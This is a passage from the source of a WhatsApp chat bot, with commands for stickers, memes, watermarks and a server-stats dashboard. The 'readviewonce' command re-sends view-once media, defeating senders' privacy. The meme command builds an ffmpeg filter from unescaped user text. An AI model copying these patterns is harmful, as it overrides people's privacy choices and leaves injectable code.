            buffer = Buffer.concat([buffer, chunk]);
        }

        // Convert to sticker (HQ)
        const sticker = new Sticker(buffer, {
            pack: "PabloNetwork - Samp V9",
            author: "Pablo",
            type: StickerTypes.FULL,
            quality: 100
        });

        const stickerBuffer = await sticker.toBuffer();

        await pablo.sendMessage(
            m.chat, 
            { sticker: stickerBuffer }, 
            { quoted: blonet }
        );

    } catch (err) {
        console.error(err);
        reply("❌ Gagal membuat stiker!");
    }
}
break;
                
case "toimg":
case "toimage":
case "tofoto":
case "tofotoimg": {
    const { message } = m;
    const ctx = message?.extendedTextMessage?.contextInfo || null;
    const quotedMessage = ctx?.quotedMessage || null;

    if (!quotedMessage?.stickerMessage)
        return reply(`❌ Balas sticker untuk mengubah menjadi gambar/video.`);

    await pablo.sendMessage(m.chat, { react: { text: "🕒", key: m.key } });

    try {
        const sharp = require("sharp");
        const webp = require("node-webpmux");
        const ffmpeg = require("fluent-ffmpeg");
        const fs = require("fs");
        const os = require("os");
        const path = require("path");

        // Download sticker
        const stream = await downloadContentFromMessage(quotedMessage.stickerMessage, "sticker");
        let buffer = Buffer.concat([]);
        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

        // Cek apakah sticker animasi
        const isAnimated = quotedMessage.stickerMessage?.isAnimated || false;

        if (isAnimated) {
            // Simpan temporer webp
            const tmpWebp = path.join(os.tmpdir(), `sticker_${Date.now()}.webp`);
            fs.writeFileSync(tmpWebp, buffer);

            // Konversi webp animasi ke mp4
            const tmpMp4 = path.join(os.tmpdir(), `sticker_${Date.now()}.mp4`);
            await new Promise((resolve, reject) => {
                ffmpeg(tmpWebp)
                    .outputOptions([
                        "-movflags faststart",
                        "-pix_fmt yuv420p",
                        "-vf scale=trunc(iw/2)*2:trunc(ih/2)*2"
                    ])
                    .toFormat("mp4")
                    .save(tmpMp4)
                    .on("end", resolve)
                    .on("error", reject);
            });

            const videoBuffer = fs.readFileSync(tmpMp4);
            await pablo.sendMessage(m.chat, { video: videoBuffer, caption: "✅ Berhasil." }, { quoted: blonet });

            // Hapus file sementara
            fs.unlinkSync(tmpWebp);
            fs.unlinkSync(tmpMp4);

        } else {
            // Sticker statis → PNG
            const imageBuffer = await sharp(buffer).png().toBuffer();
            await pablo.sendMessage(m.chat, { image: imageBuffer, caption: "✅ Berhasil." }, { quoted: blonet });
        }

    } catch (err) {
        console.error(err);
        reply(`❌ Gagal mengonversi sticker!`);
    }
}
break;
          
case "smeme": {
    const { registerFont } = require("canvas");
registerFont("./database/font/impact.ttf", { family: "Impact" });
    const { message } = m;
    const ctx = message?.extendedTextMessage?.contextInfo || null;
    const quotedMessage = ctx?.quotedMessage || null;

    if (!quotedMessage)
        return reply(`❌ Balas media (sticker/gambar/video/GIF) dengan caption *${prefix + command} textbawah|textatas*`);

    const mimeImg = quotedMessage?.imageMessage?.mimetype || "";
    const mimeStk = quotedMessage?.stickerMessage?.mimetype || "";
    const mimeVid = quotedMessage?.videoMessage?.mimetype || "";
    const mimeDoc = quotedMessage?.documentMessage?.mimetype || "";

    // Ambil teks
    let bawah = "", atas = "";
    if (text?.includes("|")) {
        let [b, a] = text.split("|");
        bawah = b?.trim() || "";
        atas  = a?.trim() || "";
    } else {
        bawah = text?.trim() || "";
    }

    await pablo.sendMessage(m.chat, { react: { text: "🕒", key: m.key } });

    try {
        const sharp = require("sharp");
        const { createCanvas, loadImage } = require("canvas");
        const ffmpeg = require("fluent-ffmpeg");
        const fs = require("fs");
        const os = require("os");
        const path = require("path");
        const { Sticker, StickerTypes } = require("wa-sticker-formatter");

        let buffer, isAnimated = false;

        // Sticker
        if (mimeStk) {
            const stream = await downloadContentFromMessage(quotedMessage.stickerMessage, "sticker");
            buffer = Buffer.concat([]);
            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
            isAnimated = quotedMessage.stickerMessage?.isAnimated || false;
            buffer = await sharp(buffer).png().toBuffer();
        }
        // Image
        else if (mimeImg) {
            const stream = await downloadContentFromMessage(quotedMessage.imageMessage, "image");
            buffer = Buffer.concat([]);
            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
            buffer = await sharp(buffer).png().toBuffer();
        }
        // Video / GIF
        else if (mimeVid || (mimeDoc && mimeDoc.startsWith("video/"))) {
            const vidMsg = quotedMessage.videoMessage || quotedMessage.documentMessage;
            const stream = await downloadContentFromMessage(vidMsg, vidMsg.videoMessage ? "video" : "document");
            buffer = Buffer.concat([]);
            for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

            // Simpan sementara
            const tmpPath = path.join(os.tmpdir(), `smeme_${Date.now()}.mp4`);
            fs.writeFileSync(tmpPath, buffer);

            // Overlay teks ke video pakai ffmpeg
            let drawTextFilter = "";
            if (atas) drawTextFilter += `drawtext=text='${atas}':fontcolor=white:fontsize=48:box=1:boxcolor=black@0.5:x=(w-text_w)/2:y=30,`;
            if (bawah) drawTextFilter += `drawtext=text='${bawah}':fontcolor=white:fontsize=48:box=1:boxcolor=black@0.5:x=(w-text_w)/2:y=h-th-30,`;
            drawTextFilter = drawTextFilter.replace(/,$/, "");

            const tmpOut = path.join(os.tmpdir(), `smeme_out_${Date.now()}.mp4`);
            await new Promise((resolve, reject) => {
                ffmpeg(tmpPath)
                    .videoFilters(drawTextFilter)
                    .output(tmpOut)
                    .on("end", resolve)
                    .on("error", reject)
                    .run();
            });

            const vidBuffer = fs.readFileSync(tmpOut);
            await pablo.sendMessage(m.chat, { video: vidBuffer, caption: "✅ Berhasil." }, { quoted: m });

            // Hapus file sementara
            fs.unlinkSync(tmpPath);
            fs.unlinkSync(tmpOut);
            return;
        } else {
            return reply("❌ Media tidak didukung, gunakan sticker, gambar, video, atau GIF.");
        }

        // Canvas untuk sticker/image
        const img = await loadImage(buffer);
        const canvas = createCanvas(img.width, img.height);
        const ctx2 = canvas.getContext("2d");

        ctx2.drawImage(img, 0, 0, img.width, img.height);

        // Text style
        let fontSize = Math.floor(img.width / 12);
        ctx2.font = `bold ${fontSize}px Impact`;
        ctx2.fillStyle = "white";
        ctx2.strokeStyle = "black";
        ctx2.lineWidth = Math.floor(fontSize / 4);
        ctx2.lineJoin = "round";
        ctx2.miterLimit = "1";
        ctx2.textAlign = "center";

        function wrapText(ctx, text, maxWidth) {
            const words = text.split(' ');
            const lines = [];
            let line = '';
            for (let n = 0; n < words.length; n++) {
                const testLine = line + words[n] + ' ';
                const metrics = ctx.measureText(testLine);
                if (metrics.width > maxWidth && n > 0) {
                    lines.push(line.trim());
                    line = words[n] + ' ';
                } else {
                    line = testLine;
                }
            }
            lines.push(line.trim());
            return lines;
        }

        const maxWidth = img.width * 0.9;

        if (atas) {
            const linesAtas = wrapText(ctx2, atas, maxWidth);
            linesAtas.forEach((l, i) => {
                const y = fontSize + 20 + i * (fontSize + 5);
                ctx2.strokeText(l, img.width / 2, y);
                ctx2.fillText(l, img.width / 2, y);
            });
        }

        if (bawah) {
            const linesBawah = wrapText(ctx2, bawah, maxWidth);
            linesBawah.reverse().forEach((l, i) => {
                const y = img.height - 20 - i * (fontSize + 5);
                ctx2.strokeText(l, img.width / 2, y);
                ctx2.fillText(l, img.width / 2, y);
            });
        }

        const finalImg = canvas.toBuffer();

        // Sticker HQ
        const stc = new Sticker(finalImg, {
            pack: "PabloNetwork - Samp V9",
            author: "Pablo",
            type: StickerTypes.FULL,
            quality: 100
        });

        const stickerFinal = await stc.toBuffer();
        await pablo.sendMessage(m.chat, { sticker: stickerFinal }, { quoted: blonet });

    } catch (err) {
        console.error(err);
        reply("❌ Terjadi error membuat smeme.");
    }
}
break;
                
case "wm": {
    const { message } = m;
    const ctx = message?.extendedTextMessage?.contextInfo || null;
    const quotedMessage = ctx?.quotedMessage || null;

    if (!quotedMessage?.stickerMessage)
        return reply(`❌ Balas sticker dengan caption *${prefix + command} Author|Packname*`);

    // Ambil input watermark
    let author = "";
    let packname = "";
    if (text?.includes("|")) {
        let [a, p] = text.split("|");
        author = a?.trim() || "";
        packname = p?.trim() || "";
    } else {
        author = text?.trim() || "";
    }

    await pablo.sendMessage(m.chat, { react: { text: "🕒", key: m.key } });

    try {
        const stream = await downloadContentFromMessage(quotedMessage.stickerMessage, "sticker");
        let buffer = Buffer.concat([]);
        for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

        const { Sticker, StickerTypes } = require("wa-sticker-formatter");

        // Sticker animasi
        const isAnimated = quotedMessage.stickerMessage.isAnimated || false;

        if (isAnimated) {
            // Sticker animasi tetap animasi (WebP)
            const stc = new Sticker(buffer, {
                pack: packname || "",
                author: author || "",
                type: StickerTypes.ANIMATED,
                quality: 100
            });

            const stickerFinal = await stc.toBuffer();
            await pablo.sendMessage(m.chat, { sticker: stickerFinal }, { quoted: m });
        } else {
            // Sticker statis → PNG → sticker HQ
            const sharp = require("sharp");
            const imgBuf = await sharp(buffer).png().toBuffer();

            const stc = new Sticker(imgBuf, {
                pack: packname || "",
                author: author || "",
                type: StickerTypes.FULL,
                quality: 100
            });

            const stickerFinal = await stc.toBuffer();
            await pablo.sendMessage(m.chat, { sticker: stickerFinal }, { quoted: m });
        }
    } catch (err) {
        console.error(err);
        reply("❌ Terjadi error membuat ulang sticker dengan watermark baru.");
    }
}
break;
                
case "🐦":
case "rvo":
case "readviewonce": {
    const { quoted, message } = m;
    const chatId = m.chat;

    const ctx = message?.extendedTextMessage?.contextInfo || null;
    const quotedMessage = ctx?.quotedMessage || null;

    if (!quotedMessage)
        return replyviex(`❌ Balas pesan ViewOnce untuk melihatnya.`);

    const mainType = Object.keys(message)[0] || "Tidak ada";
    const quotedType = quotedMessage ? Object.keys(quotedMessage)[0] : "Tidak ada";

    // Cek tipe media
    const msg = quotedMessage.message;
    const type = Object.keys(msg)[0]; // imageMessage, videoMessage, audioMessage
    const mime = msg[type]?.mimetype || "";

    // Tentukan jenis media
    let mediaType;
    if (/image/.test(type)) mediaType = "image";
    else if (/video/.test(type)) mediaType = "video";
    else if (/audio/.test(type)) mediaType = "audio";
    else return replyviex(`❌ Tipe media tidak didukung (hanya image, video, audio).`);

    try {
        //reply("📥 Mendownload media...");

        const stream = await downloadContentFromMessage(msg[type], mediaType);
        const chunks = [];
        for await (const chunk of stream) chunks.push(chunk);
        const buffer = Buffer.concat(chunks);

        //reply("📤 Mengirim media...");

        if (mediaType === "image") {
            await pablo.sendMessage(chatId, { image: buffer, caption: msg[type].caption || "" }, { quoted: blonet });
        } else if (mediaType === "video") {
            await pablo.sendMessage(chatId, { video: buffer, caption: msg[type].caption || "" }, { quoted: blonet });
        } else if (mediaType === "audio") {
            await pablo.sendMessage(chatId, { audio: buffer, mimetype: mime, ptt: msg[type].ptt || false }, { quoted: blonet });
        }

    } catch (err) {
        console.error(err);
        await pablo.sendMessage(chatId, { text: "❌ Gagal menampilkan media ViewOnce." }, { quoted: m });
    }
}
break;
                
case 'infobot':
case 'os':
case 'stats':
case 'stat':
case 'uptime':
case 'runtime':
case 'rt':
case 'ut':
case 'up':
case 'ping': {
    const {
    createCanvas,
    registerFont
} = require('canvas');
const {
    performance
} = require("perf_hooks");
const os = require("os");
const {
    execSync
} = require("child_process");

const THEME = {
    bg: "#0f1419",
    bgSecondary: "#1a1f2e",
    card: "#1e2433",
    cardHover: "#252b3d",
    primary: "#3b82f6",
    success: "#10b981",
    warning: "#f59e0b",
    danger: "#ef4444",
    purple: "#8b5cf6",
    cyan: "#06b6d4",
    pink: "#ec4899",
    textPrimary: "#f1f5f9",
    textSecondary: "#94a3b8",
    textTertiary: "#64748b",
    border: "#2d3548",
    glow: "rgba(59, 130, 246, 0.2)"
};

const formatSize = (bytes) => {
    if (bytes === 0) return '0 B';
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
};

const formatTime = (seconds) => {
    seconds = Number(seconds);
    const d = Math.floor(seconds / (3600 * 24));
    const h = Math.floor(seconds % (3600 * 24) / 3600);
    const m = Math.floor(seconds % 3600 / 60);
    const s = Math.floor(seconds % 60);
    if (d > 0) return `${d}d ${h}h ${m}m`;
    if (h > 0) return `${h}h ${m}m`;
    return `${m}m ${s}s`;
};

function drawBackground(ctx, w, h) {
    const gradient = ctx.createLinearGradient(0, 0, w, h);
    gradient.addColorStop(0, THEME.bg);
    gradient.addColorStop(0.5, THEME.bgSecondary);
    gradient.addColorStop(1, THEME.bg);
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, w, h);

    ctx.globalAlpha = 0.02;
    for (let i = 0; i < 100; i++) {
        const x = Math.random() * w;
        const y = Math.random() * h;
        const size = Math.random() * 2;
        ctx.fillStyle = THEME.textPrimary;
        ctx.beginPath();
        ctx.arc(x, y, size, 0, Math.PI * 2);
        ctx.fill();
    }
    ctx.globalAlpha = 1;

    ctx.strokeStyle = THEME.border;
    ctx.lineWidth = 1;
    for (let i = 0; i < w; i += 50) {
        ctx.globalAlpha = 0.03;
        ctx.beginPath();
        ctx.moveTo(i, 0);
        ctx.lineTo(i, h);
        ctx.stroke();
    }
    for (let i = 0; i < h; i += 50) {
        ctx.globalAlpha = 0.03;
        ctx.beginPath();
        ctx.moveTo(0, i);
        ctx.lineTo(w, i);
        ctx.stroke();
    }
    ctx.globalAlpha = 1;
}

function drawCard(ctx, x, y, w, h, radius) {
    ctx.save();
    ctx.shadowColor = THEME.glow;
    ctx.shadowBlur = 15;
    ctx.beginPath();
    ctx.roundRect(x, y, w, h, radius);
    ctx.fillStyle = THEME.card;
    ctx.fill();
    ctx.shadowBlur = 0;
    ctx.strokeStyle = THEME.border;
    ctx.lineWidth = 1;
    ctx.stroke();
    ctx.restore();
}

function drawIcon(ctx, x, y, type, color) {
    ctx.save();
    ctx.strokeStyle = color;
    ctx.fillStyle = color;
    ctx.lineWidth = 2.5;
    ctx.lineCap = 'round';
    ctx.lineJoin = 'round';

    switch (type) {
        case 'cpu':
            ctx.strokeRect(x - 12, y - 12, 24, 24);
            ctx.fillRect(x - 6, y - 6, 12, 12);
            ctx.beginPath();
            ctx.moveTo(x - 12, y - 8);
            ctx.lineTo(x - 16, y - 8);
            ctx.moveTo(x - 12, y);
            ctx.lineTo(x - 16, y);
            ctx.moveTo(x - 12, y + 8);
            ctx.lineTo(x - 16, y + 8);
            ctx.moveTo(x + 12, y - 8);
            ctx.lineTo(x + 16, y - 8);
            ctx.moveTo(x + 12, y);
            ctx.lineTo(x + 16, y);
            ctx.moveTo(x + 12, y + 8);
            ctx.lineTo(x + 16, y + 8);
            ctx.stroke();
            break;
        case 'memory':
            for (let i = 0; i < 4; i++) {
                ctx.strokeRect(x - 10 + i * 6, y - 12, 5, 24);
            }
            break;
        case 'disk':
            ctx.beginPath();
            ctx.arc(x, y, 12, 0, Math.PI * 2);
            ctx.stroke();
            ctx.beginPath();
            ctx.arc(x, y, 8, 0, Math.PI * 2);
            ctx.stroke();
            ctx.beginPath();
            ctx.arc(x, y, 3, 0, Math.PI * 2);
            ctx.fill();
            break;
        case 'network':
            ctx.beginPath();
            ctx.arc(x, y, 12, 0, Math.PI * 2);
            ctx.stroke();
            ctx.beginPath();
            ctx.moveTo(x, y - 8);
            ctx.lineTo(x, y + 8);
            ctx.moveTo(x - 8, y);
            ctx.lineTo(x + 8, y);
            ctx.stroke();
            ctx.beginPath();
            ctx.arc(x - 6, y - 6, 2, 0, Math.PI * 2);
            ctx.arc(x + 6, y - 6, 2, 0, Math.PI * 2);
            ctx.arc(x - 6, y + 6, 2, 0, Math.PI * 2);
            ctx.arc(x + 6, y + 6, 2, 0, Math.PI * 2);
            ctx.fill();
            break;
        case 'server':
            for (let i = 0; i < 3; i++) {
                ctx.strokeRect(x - 12, y - 10 + i * 8, 24, 6);
                ctx.beginPath();
                ctx.arc(x + 8, y - 7 + i * 8, 1.5, 0, Math.PI * 2);
                ctx.fill();
            }
            break;
        case 'clock':
            ctx.beginPath();
            ctx.arc(x, y, 12, 0, Math.PI * 2);
            ctx.stroke();
            ctx.beginPath();
            ctx.moveTo(x, y);
            ctx.lineTo(x, y - 8);
            ctx.moveTo(x, y);
            ctx.lineTo(x + 6, y);
            ctx.stroke();
            break;
    }
    ctx.restore();
}

function drawLogo(ctx, x, y, size) {
    ctx.save();
    const gradient = ctx.createLinearGradient(x - size, y - size, x + size, y + size);
    gradient.addColorStop(0, THEME.primary);
    gradient.addColorStop(0.5, THEME.cyan);
    gradient.addColorStop(1, THEME.purple);

    ctx.strokeStyle = gradient;
    ctx.lineWidth = 3;
    ctx.lineCap = 'round';

    ctx.beginPath();
    ctx.moveTo(x - size, y);
    ctx.lineTo(x, y - size);
    ctx.lineTo(x + size, y);
    ctx.lineTo(x, y + size);
    ctx.closePath();
    ctx.stroke();

    ctx.beginPath();
    ctx.moveTo(x - size / 2, y);
    ctx.lineTo(x, y - size / 2);
    ctx.lineTo(x + size / 2, y);
    ctx.lineTo(x, y + size / 2);
    ctx.closePath();
    ctx.stroke();

    ctx.restore();
}

function drawDonutChart(ctx, x, y, radius, lineWidth, percent, color) {
    ctx.save();
    ctx.lineCap = 'round';

    ctx.beginPath();
    ctx.arc(x, y, radius, 0, Math.PI * 2);
    ctx.strokeStyle = THEME.bgSecondary;
    ctx.lineWidth = lineWidth;
    ctx.stroke();

    const startAngle = -Math.PI / 2;
    const endAngle = startAngle + (Math.PI * 2 * (percent / 100));

    ctx.shadowColor = color;
    ctx.shadowBlur = 10;

    ctx.beginPath();
    ctx.arc(x, y, radius, startAngle, endAngle);
    ctx.strokeStyle = color;
    ctx.lineWidth = lineWidth;
    ctx.stroke();

    ctx.shadowBlur = 0;
    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 28px Arial";
    ctx.textAlign = "center";
    ctx.textBaseline = "middle";
    ctx.fillText(`${Math.round(percent)}%`, x, y);

    ctx.restore();
}

function drawProgressBar(ctx, x, y, w, h, percent, color, label, value) {
    ctx.fillStyle = THEME.bgSecondary;
    ctx.fillRect(x, y, w, h);

    const gradient = ctx.createLinearGradient(x, y, x + w, y);
    gradient.addColorStop(0, color);
    gradient.addColorStop(1, color + 'aa');
    ctx.fillStyle = gradient;
    ctx.fillRect(x, y, w * (percent / 100), h);

    ctx.strokeStyle = THEME.border;
    ctx.lineWidth = 1;
    ctx.strokeRect(x, y, w, h);

    ctx.fillStyle = THEME.textSecondary;
    ctx.font = "11px Arial";
    ctx.textAlign = "left";
    ctx.fillText(label, x, y - 6);

    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 11px Arial";
    ctx.textAlign = "right";
    ctx.fillText(value, x + w, y - 6);
}

function drawStatBox(ctx, x, y, w, h, label, value, color, iconType) {
    drawCard(ctx, x, y, w, h, 12);

    drawIcon(ctx, x + 28, y + 28, iconType, color);

    ctx.fillStyle = THEME.textSecondary;
    ctx.font = "11px Arial";
    ctx.textAlign = "left";
    ctx.fillText(label, x + 50, y + 22);

    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 16px Arial";
    ctx.fillText(value, x + 50, y + 40);
}

async function renderDashboard(stats) {
    const W = 1200;
    const H = 800;
    const canvas = createCanvas(W, H);
    const ctx = canvas.getContext('2d');

    drawBackground(ctx, W, H);

    drawLogo(ctx, 60, 50, 20);

    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 32px Arial";
    ctx.textAlign = "left";
    ctx.fillText("SYSTEM MONITOR", 100, 58);

    ctx.fillStyle = THEME.textSecondary;
    ctx.font = "13px Arial";
    ctx.fillText("Real-time Performance Dashboard", 100, 80);

    const pingStatus = stats.ping < 100 ? THEME.success : stats.ping < 300 ? THEME.warning : THEME.danger;
    ctx.fillStyle = pingStatus;
    ctx.font = "bold 28px Arial";
    ctx.textAlign = "right";
    ctx.fillText(`${stats.ping}ms`, W - 50, 50);
    ctx.fillStyle = THEME.textSecondary;
    ctx.font = "12px Arial";
    ctx.fillText("LATENCY", W - 50, 70);

    const gradient = ctx.createLinearGradient(50, 100, W - 50, 100);
    gradient.addColorStop(0, THEME.primary);
    gradient.addColorStop(0.33, THEME.success);
    gradient.addColorStop(0.66, THEME.purple);
    gradient.addColorStop(1, THEME.cyan);
    ctx.strokeStyle = gradient;
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.moveTo(50, 100);
    ctx.lineTo(W - 50, 100);
    ctx.stroke();

    const mainY = 130;
    const cardW = 260;
    const cardH = 240;
    const gap = 30;

    const x1 = 50;
    const x2 = x1 + cardW + gap;
    const x3 = x2 + cardW + gap;
    const x4 = x3 + cardW + gap;

    drawCard(ctx, x1, mainY, cardW, cardH, 15);
    drawIcon(ctx, x1 + 30, mainY + 35, 'cpu', THEME.primary);
    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 18px Arial";
    ctx.textAlign = "left";
    ctx.fillText("CPU USAGE", x1 + 55, mainY + 40);
    ctx.fillStyle = THEME.textSecondary;
    ctx.font = "11px Arial";
    ctx.fillText(`${stats.cpuCores} Cores @ ${stats.cpuSpeed} MHz`, x1 + 55, mainY + 58);
    drawDonutChart(ctx, x1 + cardW / 2, mainY + 140, 50, 12, stats.cpuLoad, THEME.primary);
    ctx.fillStyle = THEME.textTertiary;
    ctx.font = "10px Arial";
    ctx.textAlign = "center";
    ctx.fillText(stats.cpuModel.substring(0, 32), x1 + cardW / 2, mainY + 215);

    drawCard(ctx, x2, mainY, cardW, cardH, 15);
    drawIcon(ctx, x2 + 30, mainY + 35, 'memory', THEME.success);
    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 18px Arial";
    ctx.textAlign = "left";
    ctx.fillText("MEMORY", x2 + 55, mainY + 40);
    ctx.fillStyle = THEME.textSecondary;
    ctx.font = "11px Arial";
    ctx.fillText(`Total: ${formatSize(stats.ramTotal)}`, x2 + 55, mainY + 58);
    const ramPercent = (stats.ramUsed / stats.ramTotal) * 100;
    drawDonutChart(ctx, x2 + cardW / 2, mainY + 140, 50, 12, ramPercent, THEME.success);
    ctx.fillStyle = THEME.textTertiary;
    ctx.font = "11px Arial";
    ctx.textAlign = "center";
    ctx.fillText(`${formatSize(stats.ramUsed)} Used`, x2 + cardW / 2, mainY + 213);
    ctx.fillText(`${formatSize(stats.ramTotal - stats.ramUsed)} Free`, x2 + cardW / 2, mainY + 228);

    drawCard(ctx, x3, mainY, cardW, cardH, 15);
    drawIcon(ctx, x3 + 30, mainY + 35, 'disk', THEME.purple);
    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 18px Arial";
    ctx.textAlign = "left";
    ctx.fillText("STORAGE", x3 + 55, mainY + 40);
    ctx.fillStyle = THEME.textSecondary;
    ctx.font = "11px Arial";
    ctx.fillText(`Total: ${formatSize(stats.diskTotal)}`, x3 + 55, mainY + 58);
    let diskPercent = stats.diskTotal > 0 ? (stats.diskUsed / stats.diskTotal) * 100 : 0;
    drawDonutChart(ctx, x3 + cardW / 2, mainY + 140, 50, 12, diskPercent, THEME.purple);
    ctx.fillStyle = THEME.textTertiary;
    ctx.font = "11px Arial";
    ctx.textAlign = "center";
    ctx.fillText(`${formatSize(stats.diskUsed)} Used`, x3 + cardW / 2, mainY + 213);
    ctx.fillText(`${formatSize(stats.diskTotal - stats.diskUsed)} Free`, x3 + cardW / 2, mainY + 228);

    drawCard(ctx, x4, mainY, cardW, cardH, 15);
    drawIcon(ctx, x4 + 30, mainY + 35, 'network', THEME.cyan);
    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 18px Arial";
    ctx.textAlign = "left";
    ctx.fillText("NETWORK", x4 + 55, mainY + 40);
    ctx.fillStyle = THEME.textSecondary;
    ctx.font = "11px Arial";
    ctx.fillText(`Interface: ${stats.networkInterface}`, x4 + 55, mainY + 58);

    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 13px Arial";
    ctx.textAlign = "left";
    ctx.fillText("RX (Download)", x4 + 30, mainY + 95);
    ctx.fillStyle = THEME.cyan;
    ctx.font = "bold 20px Arial";
    ctx.fillText(formatSize(stats.networkRx), x4 + 30, mainY + 120);

    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 13px Arial";
    ctx.fillText("TX (Upload)", x4 + 30, mainY + 155);
    ctx.fillStyle = THEME.pink;
    ctx.font = "bold 20px Arial";
    ctx.fillText(formatSize(stats.networkTx), x4 + 30, mainY + 180);

    ctx.fillStyle = THEME.textTertiary;
    ctx.font = "10px Arial";
    ctx.textAlign = "center";

    const statsY = 400;
    const statW = 175;
    const statH = 70;
    const statGap = 20;

    let hostname = stats.hostname;

    if (hostname.toLowerCase().includes("root")) { hostname = "root"; } else if (hostname.length > 6) { hostname = "pterodactyl"; }
    drawStatBox(ctx, 50, statsY, statW, statH, "HOSTNAME", hostname, THEME.primary, 'server');
    drawStatBox(ctx, 50 + (statW + statGap), statsY, statW, statH, "PLATFORM", `${stats.platform} (${stats.arch})`, THEME.success, 'server');
    drawStatBox(ctx, 50 + (statW + statGap) * 2, statsY, statW, statH, "BOT UPTIME", stats.uptimeBot, THEME.purple, 'clock');
    drawStatBox(ctx, 50 + (statW + statGap) * 3, statsY, statW, statH, "SERVER UPTIME", stats.uptimeServer, THEME.warning, 'clock');
    drawStatBox(ctx, 50 + (statW + statGap) * 4, statsY, statW, statH, "NODE.JS", stats.nodeVersion, THEME.cyan, 'server');

    const perfY = 500;
    const perfH = 250;
    const perfW = W - 100;

    drawCard(ctx, 50, perfY, perfW, perfH, 15);

    ctx.fillStyle = THEME.textPrimary;
    ctx.font = "bold 20px Arial";
    ctx.textAlign = "left";
    ctx.fillText("SYSTEM PERFORMANCE", 75, perfY + 35);

    ctx.fillStyle = THEME.textSecondary;
    ctx.font = "12px Arial";
    ctx.fillText("Real-time resource monitoring", 75, perfY + 55);

    const barY = perfY + 85;
    const barW = 500;
    const barH = 18;
    const barGap = 35;

    drawProgressBar(ctx, 75, barY, barW, barH, stats.cpuLoad, THEME.primary,
        "CPU Load", `${stats.cpuLoad}%`);
    drawProgressBar(ctx, 75, barY + barGap, barW, barH, ramPercent, THEME.success,
        "Memory Usage", `${Math.round(ramPercent)}%`);
    drawProgressBar(ctx, 75, barY + barGap * 2, barW, barH, diskPercent, THEME.purple,
        "Disk Usage", `${Math.round(diskPercent)}%`);
    drawProgressBar(ctx, 75, barY + barGap * 3, barW, barH,
        Math.min(100, (stats.ping / 500) * 100), pingStatus,
        "Network Latency", `${stats.ping}ms`);

    const infoX = 620;
    const infoStartY = perfY + 85;
    const infoLineHeight = 28;
    let infoY = infoStartY;

    ctx.font = "13px Arial";
    ctx.textAlign = "left";

    const drawInfoLine = (label, value) => {
        ctx.fillStyle = THEME.textSecondary;
        ctx.fillText(label, infoX, infoY);
        ctx.fillStyle = THEME.textPrimary;
        ctx.font = "bold 13px Arial";
        ctx.fillText(value, infoX + 150, infoY);
        ctx.font = "13px Arial";
        infoY += infoLineHeight;
    };

    drawInfoLine("OS Release", stats.release);
    drawInfoLine("CPU Cores", `${stats.cpuCores} Cores`);
    drawInfoLine("CPU Speed", `${stats.cpuSpeed} MHz`);
    drawInfoLine("Total Memory", formatSize(stats.ramTotal));
    drawInfoLine("Free Memory", formatSize(stats.ramTotal - stats.ramUsed));

    ctx.fillStyle = THEME.textTertiary;
    ctx.font = "10px Arial";
    ctx.textAlign = "center";
    ctx.fillText(`Dashboard Generated: ${new Date().toLocaleString()}`, W / 2, H - 20);

    return canvas.toBuffer('image/png');
}

function getNetworkStats() {
    try {
        const interfaces = os.networkInterfaces();
        let totalRx = 0;
        let totalTx = 0;
        let activeInterface = 'N/A';
        let ip = 'N/A';

        for (const [name, addrs] of Object.entries(interfaces)) {
            if (name.toLowerCase().includes('lo')) continue;

            for (const addr of addrs) {
                if (addr.family === 'IPv4' && !addr.internal) {
                    activeInterface = name;
                    ip = addr.address;
                    break;
                }
            }
        }

        try {
            const netstat = execSync("cat /proc/net/dev 2>/dev/null || echo ''").toString();
            const lines = netstat.split('\n');

            for (const line of lines) {
                if (line.includes(':') && !line.includes('lo:')) {
                    const parts = line.trim().split(/\s+/);
                    if (parts.length >= 10) {
                        totalRx += parseInt(parts[1]) || 0;
                        totalTx += parseInt(parts[9]) || 0;
                    }
                }
            }
        } catch (e) {}

        return {
            totalRx,
            totalTx,
            activeInterface,
            ip
        };
    } catch (e) {
        return {
            totalRx: 0,
            totalTx: 0,
            activeInterface: 'N/A',
            ip: 'N/A'
        };
    }
}

async function pstart() {
try {
        //const loadingMsg = await reply("Generating dashboard...");

        const start = performance.now();
        await new Promise(resolve => setTimeout(resolve, 10));
        const end = performance.now();
        const latency = (end - start).toFixed(2);

        const cpus = os.cpus();
        const totalMem = os.totalmem();
        const freeMem = os.freemem();
        const loadAvg = os.loadavg();
        const cpuPercent = Math.min(100, (loadAvg[0] * 100) / cpus.length).toFixed(1);
   
        const cpuSpeed = (() => {
            try {
                const output = execSync("grep 'cpu MHz' /proc/cpuinfo | head -1").toString();

                const mhz = parseFloat(output.split(":")[1]);

                if (!isNaN(mhz) && mhz > 0) return Math.round(mhz); 
            } catch (e) {}

            const speed = os.cpus()?.[0]?.speed;
            if (speed && speed > 0) return speed;

            return "0";
        })();
    
        const net = require('net');

        const tcpPing = (host = "195.88.211.226", port = 80) => {
    return new Promise((resolve) => {
        const start = Date.now();
        const socket = new net.Socket();

        socket.setTimeout(2000);

        socket.on('connect', () => {
            const ms = Date.now() - start;
            socket.destroy();
            resolve(`${ms}`);
        });

        socket.on('timeout', () => {
            socket.destroy();
            resolve('Timeout');
        });

        socket.on('error', () => {
            resolve('Unreachable');
        });

        socket.connect(port, host);
    });
};

const pingID = await tcpPing();
    
        const pidusage = require('pidusage');

const cpuCek = async () => {
    const stat = await pidusage(process.pid).catch(() => ({ cpu: 0 }));

